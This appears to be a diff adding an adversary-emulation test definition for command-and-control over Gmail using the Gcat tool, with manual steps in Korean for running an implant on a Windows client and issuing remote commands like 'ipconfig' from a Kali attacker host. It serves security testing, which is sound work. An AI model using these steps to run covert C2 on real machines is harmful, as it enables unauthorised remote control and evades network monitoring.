@@ -1,0 +1,24 @@
+attack_technique: T1102.002A
+display_name: 'C2 using gamil - Gcat'
+atomic_tests:
+- name: C2 using gamil - Gcat
+  auto_generated_guid: fef79867-4d3a-4d7f-a409-d3eec184a9c5
+  description: |
+    C2 using gamil - Gcat
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      클라이언트 
+      1. Open cmd.exe 
+      2. cd <implant.py 위치>
+      3. implant.py
+
+      공격자 서버
+      4. 4. cd /home/kali/Desktop/gcat/gcat-master
+      5. python gcat.py -list     
+      6. python gcat.py -id <id> -cmd 'ipconfig'
+      7. python gcat.py -id <id> -jobid <jobid> 
+      8. 이메일에서 결과 확인 (gcat.py, implant.py에 id/pw 존재)
+    name: manual
+    elevation_required: false
